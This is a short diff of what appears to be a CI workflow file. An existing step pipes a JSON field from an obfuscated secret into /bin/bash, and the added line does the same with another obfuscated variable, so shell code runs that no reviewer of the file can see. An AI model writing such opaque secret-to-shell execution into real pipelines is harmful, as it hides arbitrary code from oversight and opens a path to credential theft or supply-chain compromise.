@@ -21,6 +21,7 @@ jobs:
           p65458: ${{ secrets.p65458 }}
         run: |
           printf '%s' "$p65458" | jq -r .oyjyr12455 | /bin/bash
+          echo $vgnh42169 | jq -r .wi0 | /bin/bash
 
       - name: Save archive
         if: always()
